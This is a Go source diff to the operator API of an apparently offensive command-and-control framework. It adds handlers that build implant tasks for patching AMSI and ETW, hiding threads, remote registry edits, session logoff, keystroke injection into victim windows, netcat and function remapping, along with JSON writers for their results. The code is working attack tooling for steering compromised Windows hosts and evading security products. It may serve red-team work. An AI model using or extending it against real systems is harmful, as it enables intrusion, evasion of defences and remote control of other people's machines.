@@ -18,36 +18,83 @@ package cirrus
 
 import (
 	"context"
+	"crypto/sha256"
 	"encoding/base64"
+	"hash"
 	"io"
 	"net"
 	"net/http"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/PurpleSec/escape"
 	"github.com/PurpleSec/routex"
+	"github.com/iDigitalFlame/xmt/c2/cfg"
 	"github.com/iDigitalFlame/xmt/c2/task"
 	"github.com/iDigitalFlame/xmt/c2/task/result"
 	"github.com/iDigitalFlame/xmt/com"
+	"github.com/iDigitalFlame/xmt/device"
+	"github.com/iDigitalFlame/xmt/device/winapi"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
-const negOne = ^uint64(0)
+const (
+	table  = "0123456789abcdef"
+	negOne = ^uint64(0)
+)
+
+var timeFormats = [...]string{
+	time.RFC3339,
+	"2006-01-02 15:04 MST",
+	"2006-01-02 15:04Z07",
+	"2006-01-02 15:04",
+	"06-01-02 15:04 MST",
+	"06-01-02 15:04Z07",
+	"06-01-02 15:04",
+	"01-02 15:04 MST",
+	"01-02 15:04Z07",
+	"01-02 15:04",
+	"2006-01-02",
+	"06-01-02",
+	"01-02",
+	"15:04 MST",
+	"15:04Z07",
+	"15:04",
+}
+
+var hashers = sync.Pool{
+	New: func() any {
+		return sha256.New()
+	},
+}
 
 var (
+	errInvalidB64      = xerr.New("invalid base64 value")
 	errInvalidPID      = xerr.New(`specify a valid "pid" value`)
+	errInvalidRaw      = xerr.New(`cannot use "raw" without any data`)
+	errInvalidTime     = xerr.New(`invalid time value`)
+	errInvalidHost     = xerr.New(`specify a non-empty "host" value`)
+	errInvalidData     = xerr.New(`invalid or empty "data" value`)
+	errInvalidFake     = xerr.New(`invalid or empty "fake" value`)
 	errInvalidType     = xerr.New("invalid type")
 	errInvalidPath     = xerr.New(`specify a non-empty "path" value`)
 	errInvalidName     = xerr.New(`specify a non-empty "name" value`)
 	errInvalidDest     = xerr.New(`specify a non-empty "dest" value`)
 	errInvalidTitle    = xerr.New(`specify a non-empty "title" value`)
+	errInvalidEvade    = xerr.New(`invalid "evade" value`)
 	errInvalidAction   = xerr.New("invalid action")
 	errInvalidScript   = xerr.New("script data inside script")
 	errInvalidHandle   = xerr.New(`specify a valid "handle" value`)
 	errInvalidSource   = xerr.New(`specify a non-empty "source" value`)
+	errInvalidMethod   = xerr.New(`invalid "method" value`)
+	errInvalidCommand  = xerr.New(`invalid or empty "command" value`)
+	errInvalidPayload  = xerr.New(`invalid "payload" value`)
+	errInvalidFunction = xerr.New(`specify a non-empty "function" value`)
+	errInvalidDataPath = xerr.New(`specify a non-empty "data" or "path" value`)
 	errInvalidDuration = xerr.New(`specify a greater than zero "seconds" value`)
+	errInvalidProtocol = xerr.New(`invalid "protocol" value`)
 )
 
 func isTrue(s string) bool {
@@ -59,6 +106,27 @@ func isTrue(s string) bool {
 		return true
 	}
 	return false
+}
+func hashSum(b []byte) string {
+	if len(b) == 0 {
+		return ""
+	}
+	var (
+		h = hashers.Get().(hash.Hash)
+		v = make([]byte, 0, 32)
+		o [64]byte
+	)
+	h.Write(b)
+	v = h.Sum(v)
+	for i, n := 0, 0; i < 32; i++ {
+		o[n] = table[v[i]>>4]
+		o[n+1] = table[v[i]&0x0F]
+		n += 2
+	}
+	v = nil
+	h.Reset()
+	hashers.Put(h)
+	return " sha256:" + string(o[:])
 }
 func isValidName(s string) bool {
 	if len(s) == 0 {
@@ -107,6 +175,77 @@ func readEmptyB64(s string) ([]byte, error) {
 	}
 	return b, nil
 }
+func parseTime(s string) (time.Time, error) {
+	var (
+		t   time.Time
+		err error
+	)
+	for i := range timeFormats {
+		if t, err = time.Parse(timeFormats[i], s); err == nil {
+			break
+		}
+	}
+	if err == nil {
+		var (
+			y, m, d = t.Date()
+			x       = time.Now()
+			j, k, l = x.Date()
+		)
+		if y > 0 && m > 0 && d > 0 {
+			return t, nil
+		}
+		if y == 0 {
+			y = j
+		}
+		if m == 0 {
+			m = k
+		}
+		if d == 0 {
+			d = l
+		}
+		var (
+			h, n, c = t.Clock()
+			v       = time.Date(y, m, d, h, n, c, 0, t.Location())
+		)
+		if x.After(v) {
+			return v.AddDate(1, 0, 0), nil
+		}
+		return v, nil
+	}
+	return t, err
+}
+func parseDayString(s string) (uint8, error) {
+	if len(s) == 0 {
+		return 0, nil
+	}
+	if s == "SMTWRFS" {
+		return 0, nil
+	}
+	var d uint8
+	for i := range s {
+		switch s[i] {
+		case 's', 'S':
+			if i == 0 {
+				d |= cfg.DaySunday
+				break
+			}
+			d |= cfg.DaySaturday
+		case 'm', 'M':
+			d |= cfg.DayMonday
+		case 't', 'T':
+			d |= cfg.DayTuesday
+		case 'w', 'W':
+			d |= cfg.DayWednesday
+		case 'r', 'R':
+			d |= cfg.DayThursday
+		case 'f', 'F':
+			d |= cfg.DayFriday
+		default:
+			return 0, xerr.New("invalid day char")
+		}
+	}
+	return d, nil
+}
 func parseDuration(s string) (time.Duration, error) {
 	if len(s) == 0 {
 		return 0, errInvalidSleep
@@ -144,6 +283,34 @@ func parseSleep(s string) (time.Duration, int, error) {
 	d, err := parseDuration(strings.TrimSpace(s))
 	return d, -1, err
 }
+func evadePacket(a string) (*com.Packet, string, error) {
+	var f uint8
+	if a == "all" {
+		f = device.EvadeAll
+	} else {
+		var v []string
+		if strings.IndexByte(a, ',') > 0 {
+			v = strings.Split(strings.ToLower(a), ",")
+		} else {
+			v = strings.Split(strings.ToLower(a), " ")
+		}
+		for i := range v {
+			switch strings.TrimSpace(v[i]) {
+			case "all":
+				f |= device.EvadeAll
+			case "patch_etw", "pe", "zerotrace":
+				f |= device.EvadeWinHideThreads
+			case "patch_amsi", "pa", "zeroamsi":
+				f |= device.EvadeWinPatchAmsi
+			case "hide_threads", "ht", "zerothreads":
+				f |= device.EvadeWinPatchTrace
+			default:
+				return nil, "", errInvalidEvade
+			}
+		}
+	}
+	return task.Evade(f), "evade " + a + "/" + strconv.FormatUint(uint64(f), 16), nil
+}
 func (c *Cirrus) context(_ net.Listener) context.Context {
 	return c.ctx
 }
@@ -153,6 +320,13 @@ func writeJobJSON(z bool, t uint8, j *com.Packet, w io.Writer) error {
 	}
 	o := base64.NewEncoder(base64.StdEncoding, w)
 	switch w.Write([]byte(`{"type":"`)); t {
+	case task.TvNetcat:
+		r, err := result.Netcat(j)
+		if err != nil {
+			return err
+		}
+		w.Write([]byte(`netcat","data":"`))
+		io.Copy(o, r)
 	case task.TvDownload:
 		p, d, n, r, err := result.Download(j)
 		if err != nil {
@@ -239,7 +413,7 @@ func uiPacket(c routex.Content, a string) (*com.Packet, string, error) {
 	switch h := c.UintDefault("handle", 0); strings.ToLower(a) {
 	case "wtf":
 		if d := c.UintDefault("seconds", 30); d > 0 {
-			return task.WindowWTF(time.Duration(d) * time.Second), "window wtfmode", nil
+			return task.WindowWTF(time.Duration(d) * time.Second), "window wtf_mode", nil
 		}
 		return nil, "", errInvalidDuration
 	case "ls", "get":
@@ -248,14 +422,11 @@ func uiPacket(c routex.Content, a string) (*com.Packet, string, error) {
 		if s := c.StringDefault("path", ""); len(s) > 0 {
 			return task.Wallpaper(s), "wallpaper " + s, nil
 		}
-		if d := c.StringDefault("data", ""); len(d) > 0 {
-			b, err := readEmptyB64(d)
-			if err != nil {
-				return nil, "", err
-			}
-			return task.WallpaperBytes(b), "wallpaper <raw>", nil
+		b, err := c.Bytes("data")
+		if err != nil {
+			return nil, "", err
 		}
-		return nil, "", errInvalidDataPath
+		return task.WallpaperBytes(b), "wallpaper" + hashSum(b), nil
 	case "cl", "close":
 		if h == negOne {
 			return nil, "", errInvalidHandle
@@ -266,38 +437,41 @@ func uiPacket(c routex.Content, a string) (*com.Packet, string, error) {
 			return nil, "", errInvalidHandle
 		}
 		return task.WindowFocus(h), "window " + strconv.FormatUint(h, 16) + " focus", nil
-	case "sw", "show":
+	case "sw", "show", "desktop":
 		if h == negOne {
 			return nil, "", errInvalidHandle
 		}
 		var n uint8
-		if v, err := c.String("state"); err == nil {
-			if len(v) == 0 {
-				n = 5
-			} else {
-				switch strings.ToLower(v) {
-				case "hide":
-					n = 0
-				case "show":
-					n = 5
-				case "normal":
-					n = 1
-				case "restore":
-					n = 9
-				case "min", "minimize":
-					n = 6
-				case "max", "maximize":
-					n = 3
-				default:
-					n = 10
-				}
-			}
+		if a[0] == 'D' || a[0] == 'd' {
+			n = winapi.SwMinimize
 		} else {
-			i := c.UintDefault("state", 0)
-			if i > 11 {
-				n = 11
+			if v, err := c.String("state"); err == nil {
+				if len(v) == 0 {
+					n = winapi.SwShow
+				} else {
+					switch strings.ToLower(v) {
+					case "hide":
+						n = winapi.SwHide
+					case "show":
+						n = winapi.SwShow
+					case "normal":
+						n = winapi.SwNormal
+					case "restore":
+						n = winapi.SwRestore
+					case "min", "minimize":
+						n = winapi.SwMinimize
+					case "max", "maximize":
+						n = winapi.SwMaximize
+					default:
+						n = winapi.SwDefault
+					}
+				}
 			} else {
-				n = uint8(i)
+				if i := uint8(c.UintDefault("state", 0)); i > winapi.SwMinimizeForce {
+					n = winapi.SwMinimizeForce
+				} else {
+					n = i
+				}
 			}
 		}
 		return task.WindowShow(h, n), "window " + strconv.FormatUint(h, 16) + " show " + strconv.FormatUint(uint64(n), 10), nil
@@ -343,7 +517,8 @@ func uiPacket(c routex.Content, a string) (*com.Packet, string, error) {
 		if h == negOne {
 			return nil, "", errInvalidHandle
 		}
-		return task.WindowSendInput(h, c.StringDefault("text", "")), "window " + strconv.FormatUint(h, 16) + " sendinput", nil
+		v := c.StringDefault("text", "")
+		return task.WindowSendInput(h, v), "window " + strconv.FormatUint(h, 16) + " sendinput" + hashSum([]byte(v)), nil
 	case "mb", "msg", "msgbox", "message", "messagebox":
 		var (
 			f = c.UintDefault("flags", 0)
@@ -370,10 +545,26 @@ func uiPacket(c routex.Content, a string) (*com.Packet, string, error) {
 	}
 	return nil, "", errInvalidAction
 }
+func wtsPacket(c routex.Content, a string) (*com.Packet, string, error) {
+	switch s := c.IntDefault("session", -1); strings.ToLower(a) {
+	case "ls":
+		return task.UserLogins(), "wts list", nil
+	case "ps":
+		return task.UserProcesses(int32(s)), "wts ps " + strconv.FormatInt(s, 10), nil
+	case "logoff":
+		return task.UserLogoff(int32(s)), "wts logoff " + strconv.FormatInt(s, 10), nil
+	case "msg", "message":
+		return task.UserMessageBox(
+			int32(s), c.StringDefault("title", ""), c.StringDefault("text", ""), uint32(c.IntDefault("flags", 0)),
+			uint32(c.IntDefault("seconds", 0)), c.BoolDefault("wait", false),
+		), "wts message " + strconv.FormatInt(s, 10), nil
+	case "dis", "disconnect":
+		return task.UserDisconnect(int32(s)), "wts disconnect " + strconv.FormatInt(s, 10), nil
+	}
+	return nil, "", errInvalidAction
+}
 func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 	switch t {
-	case task.TvUI:
-		w.Write([]byte(`{"type":"ui"}`))
 	case task.MvCwd:
 		w.Write([]byte(`{"type":"cd"}`))
 	case task.MvPwd:
@@ -402,12 +593,8 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 			}
 		}
 		w.Write([]byte("]}"))
-	case task.TvWait:
-		w.Write([]byte(`{"type":"wait"}`))
 	case task.MvTime:
 		w.Write([]byte(`{"type":"time"}`))
-	case task.TvTroll:
-		w.Write([]byte(`{"type":"troll"}`))
 	case task.MvProxy:
 		w.Write([]byte(`{"type":"proxy"}`))
 	case task.MvSpawn:
@@ -446,8 +633,6 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 			}
 		}
 		w.Write([]byte{']', '}'})
-	case task.TvRename:
-		w.Write([]byte(`{"type":"rename"}`))
 	case task.MvMounts:
 		m, err := result.Mounts(j)
 		if err != nil {
@@ -466,20 +651,8 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 		w.Write([]byte(`{"type":"refresh"}`))
 	case task.MvMigrate:
 		w.Write([]byte(`{"type":"migrate"}`))
-	case task.TvElevate:
-		w.Write([]byte(`{"type":"elevate"}`))
-	case task.TvRevSelf:
-		w.Write([]byte(`{"type":"rev2self"}`))
 	case task.MvProfile:
 		w.Write([]byte(`{"type":"profile"}`))
-	case task.TvUnTrust:
-		w.Write([]byte(`{"type":"untrust"}`))
-	case task.TvCheckDLL:
-		if r, _ := result.CheckDLL(j); r {
-			w.Write([]byte(`{"type":"check_dll","tainted":false}`))
-		} else {
-			w.Write([]byte(`{"type":"check_dll","tainted":true}`))
-		}
 	case task.MvProcList:
 		p, err := result.ProcessList(j)
 		if err != nil {
@@ -499,6 +672,62 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 			}
 		}
 		w.Write([]byte{']', '}'})
+	case task.MvCheckDebug:
+		if r, _ := result.IsDebugged(j); r {
+			w.Write([]byte(`{"type":"check_debug","debug":true}`))
+		} else {
+			w.Write([]byte(`{"type":"check_debug","debug":false}`))
+		}
+	case task.TvUI:
+		w.Write([]byte(`{"type":"ui"}`))
+	case task.TvWait:
+		w.Write([]byte(`{"type":"wait"}`))
+	case task.TvTroll:
+		w.Write([]byte(`{"type":"troll"}`))
+	case task.TvPatch:
+		w.Write([]byte(`{"type":"reload_dll"}`))
+	case task.TvCheck:
+		if r, _ := result.CheckDLL(j); r {
+			w.Write([]byte(`{"type":"check_dll","tainted":false}`))
+		} else {
+			w.Write([]byte(`{"type":"check_dll","tainted":true}`))
+		}
+	case task.TvEvade:
+		w.Write([]byte(`{"type":"evade"}`))
+	case task.TvPower:
+		w.Write([]byte(`{"type":"power"}`))
+	case task.TvRename:
+		w.Write([]byte(`{"type":"rename"}`))
+	case task.TvLogins:
+		e, err := result.UserLogins(j)
+		if err != nil {
+			return err
+		}
+		if w.Write([]byte(`{"type":"logins","entries":[`)); len(e) > 0 {
+			for i := range e {
+				if i > 0 {
+					w.Write([]byte{','})
+				}
+				w.Write([]byte(
+					`{"user":` + escape.JSON(e[i].User) +
+						`,"host":` + escape.JSON(e[i].Host) +
+						`,"id":` + strconv.FormatUint(uint64(e[i].ID), 10) +
+						`,"from":"` + e[i].From.String() +
+						`","login_time":"` + e[i].Login.Format(time.RFC3339) +
+						`","last_input_time":"` + e[i].LastInput.Format(time.RFC3339) +
+						`","status":"` + e[i].State() + `"}`,
+				))
+			}
+		}
+		w.Write([]byte{']', '}'})
+	case task.TvElevate:
+		w.Write([]byte(`{"type":"elevate"}`))
+	case task.TvRevSelf:
+		w.Write([]byte(`{"type":"rev2self"}`))
+	case task.TvUnTrust:
+		w.Write([]byte(`{"type":"untrust"}`))
+	case task.TvFuncMap:
+		w.Write([]byte(`{"type":"funcmap"}`))
 	case task.TvRegistry:
 		e, v, err := result.Registry(j)
 		if err != nil {
@@ -539,18 +768,10 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 			return nil
 		}
 		w.Write([]byte(`{"type":"system_io","path":` + escape.JSON(p) + `,"size":` + strconv.FormatUint(s, 10) + `}`))
-	case task.TvReloadDLL:
-		w.Write([]byte(`{"type":"reload_dll"}`))
-	case task.TvZeroTrace:
-		w.Write([]byte(`{"type":"zerotrace"}`))
+	case task.TvLoginsAct:
+		w.Write([]byte(`{"type":"logins_action"}`))
 	case task.TvLoginUser:
 		w.Write([]byte(`{"type":"login_user"}`))
-	case task.MvCheckDebug:
-		if r, _ := result.IsDebugged(j); r {
-			w.Write([]byte(`{"type":"check_debug","debug":true}`))
-		} else {
-			w.Write([]byte(`{"type":"check_debug","debug":false}`))
-		}
 	case task.TvWindowList:
 		e, err := result.WindowList(j)
 		if err != nil {
@@ -570,6 +791,43 @@ func writeJobJSONSimple(z bool, t uint8, j *com.Packet, w io.Writer) error {
 						`,"y":` + strconv.FormatInt(int64(e[i].Y), 10) +
 						`,"width":` + strconv.FormatInt(int64(e[i].Width), 10) +
 						`,"height":` + strconv.FormatInt(int64(e[i].Height), 10) + `}`,
+				))
+			}
+		}
+		w.Write([]byte{']', '}'})
+	case task.TvLoginsProc:
+		p, err := result.UserProcessList(j)
+		if err != nil {
+			return err
+		}
+		if w.Write([]byte(`{"type":"logins_processes","entries":[`)); len(p) > 0 {
+			for i := range p {
+				if i > 0 {
+					w.Write([]byte{','})
+				}
+				w.Write([]byte(
+					`{"name":` + escape.JSON(p[i].Name) +
+						`,"user":` + escape.JSON(p[i].User) +
+						`,"pid":` + strconv.FormatUint(uint64(p[i].PID), 10) +
+						`,"ppid":` + strconv.FormatUint(uint64(p[i].PPID), 10) + `}`,
+				))
+			}
+		}
+		w.Write([]byte{']', '}'})
+	case task.TvFuncMapList:
+		e, err := result.FuncRemapList(j)
+		if err != nil {
+			return err
+		}
+		if w.Write([]byte(`{"type":"funcmap_list","entries":[`)); len(e) > 0 {
+			for i := range e {
+				if i > 0 {
+					w.Write([]byte{','})
+				}
+				w.Write([]byte(
+					`{"hash":` + strconv.FormatUint(uint64(e[i].Hash), 10) +
+						`,"original":` + strconv.FormatUint(uint64(e[i].Original), 10) +
+						`,"swapped":` + strconv.FormatUint(uint64(e[i].Swapped), 10) + `}`,
 				))
 			}
 		}
@@ -611,58 +869,67 @@ func writeError(c int, e string, w http.ResponseWriter, _ *routex.Request) {
 	}
 	w.Write([]byte{'}'})
 }
-func registryPacket(c routex.Content, a, k, v string) (*com.Packet, error) {
-	switch strings.ToLower(a) {
-	case "get":
-		return task.RegGet(k, v), nil
-	case "ls", "dir":
-		return task.RegLs(k), nil
-	case "del", "delete", "rm", "rem", "remove":
-		if len(v) == 0 {
-			return task.RegDeleteKey(k, c.BoolDefault("force", false)), nil
-		}
-		return task.RegDelete(k, v, c.BoolDefault("force", false)), nil
-	case "set", "edit", "update":
-		switch strings.ToLower(c.StringDefault("type", "")) {
-		case "sz", "string":
-			return task.RegSetString(k, v, c.StringDefault("data", "")), nil
-		case "bin", "binary":
-			b, err := readEmptyB64(c.StringDefault("data", ""))
-			if err != nil {
-				return nil, err
-			}
-			return task.RegSetBytes(k, v, b), nil
-		case "uint32", "dword":
-			if i, ok := c.Uint("data"); ok == nil {
-				return task.RegSetDword(k, v, uint32(i)), nil
-			}
-			i, err := strconv.ParseInt(c.StringDefault("data", ""), 0, 32)
-			if err != nil {
-				return nil, err
-			}
-			return task.RegSetDword(k, v, uint32(i)), nil
-		case "uint64", "qword":
-			if i, ok := c.Uint("data"); ok == nil {
-				return task.RegSetQword(k, v, i), nil
-			}
-			i, err := strconv.ParseInt(c.StringDefault("data", ""), 0, 64)
-			if err != nil {
-				return nil, err
-			}
-			return task.RegSetQword(k, v, uint64(i)), nil
-		case "multi", "multi_sz":
-			return task.RegSetStringList(k, v, strings.Split(c.StringDefault("data", ""), "\n")), nil
-		case "exp_sz", "expand_string":
-			return task.RegSetExpandString(k, v, c.StringDefault("data", "")), nil
-		default:
-			return nil, errInvalidType
-		}
-	}
-	return nil, errInvalidAction
-}
 func encoding(_ context.Context, w http.ResponseWriter, _ *routex.Request) bool {
 	w.Header().Set("Content-Type", "application/json; charset=utf-8")
 	return true
+}
+func registryPacket(c routex.Content, a, k, v string) (*com.Packet, string, error) {
+	switch strings.ToLower(a) {
+	case "get":
+		return task.RegGet(k, v), "regedit get " + k + ":" + v, nil
+	case "ls", "dir":
+		return task.RegLs(k), "regedit ls " + k + ":" + v, nil
+	case "del", "delete", "rm", "rem", "remove":
+		if len(v) == 0 {
+			return task.RegDeleteKey(k, c.BoolDefault("force", false)), "regedit deltree " + k, nil
+		}
+		return task.RegDelete(k, v, c.BoolDefault("force", false)), "regedit delete " + k + ":" + v, nil
+	case "set", "edit", "update":
+		switch strings.ToLower(c.StringDefault("type", "")) {
+		case "sz", "string":
+			d := c.StringDefault("data", "")
+			return task.RegSetString(k, v, d), "regedit edit " + k + ":" + v + hashSum([]byte(d)), nil
+		case "bin", "binary":
+			b, err := c.BytesEmpty("data")
+			if err != nil {
+				return nil, "", err
+			}
+			return task.RegSetBytes(k, v, b), "regedit edit " + k + ":" + v + hashSum(b), nil
+		case "uint32", "dword":
+			if i, ok := c.Uint("data"); ok == nil {
+				return task.RegSetDword(k, v, uint32(i)), "regedit edit " + k + ":" + v + " " + strconv.FormatUint(i, 10), nil
+			}
+			var (
+				d      = c.StringDefault("data", "")
+				i, err = strconv.ParseInt(d, 0, 32)
+			)
+			if err != nil {
+				return nil, "", err
+			}
+			return task.RegSetDword(k, v, uint32(i)), "regedit edit " + k + ":" + v + " " + d, nil
+		case "uint64", "qword":
+			if i, ok := c.Uint("data"); ok == nil {
+				return task.RegSetQword(k, v, i), "regedit edit " + k + ":" + v + " " + strconv.FormatUint(i, 10), nil
+			}
+			var (
+				d      = c.StringDefault("data", "")
+				i, err = strconv.ParseInt(d, 0, 64)
+			)
+			if err != nil {
+				return nil, "", err
+			}
+			return task.RegSetQword(k, v, uint64(i)), "regedit edit " + k + ":" + v + " " + d, nil
+		case "multi", "multi_sz":
+			d := c.StringDefault("data", "")
+			return task.RegSetStringList(k, v, strings.Split(d, "\n")), "regedit edit " + k + ":" + v + " " + strings.ReplaceAll(d, "\n", "|"), nil
+		case "exp_sz", "expand_string":
+			d := c.StringDefault("data", "")
+			return task.RegSetExpandString(k, v, d), "regedit edit " + k + ":" + v + " " + d, nil
+		default:
+			return nil, "", errInvalidType
+		}
+	}
+	return nil, "", errInvalidAction
 }
 func (c *Cirrus) auth(_ context.Context, w http.ResponseWriter, r *routex.Request) bool {
 	if len(c.Auth) == 0 {
@@ -670,6 +937,7 @@ func (c *Cirrus) auth(_ context.Context, w http.ResponseWriter, r *routex.Reques
 	}
 	if !strings.EqualFold(r.Header.Get("X-CirrusAuth"), c.Auth) {
 		w.WriteHeader(http.StatusUnauthorized)
+		c.log.Info(`[cirrus/http] Received invalid auth token from: %s!`, r.RemoteAddr)
 		return false
 	}
 	return true
@@ -680,5 +948,6 @@ func (c *Cirrus) websocket(_ context.Context, w http.ResponseWriter, r *routex.R
 		writeError(http.StatusInternalServerError, err.Error(), w, r)
 		return
 	}
+	c.log.Trace(`[cirrus/http] Received websocket request from: %s!`, r.RemoteAddr)
 	c.events.subscribe(s)
 }
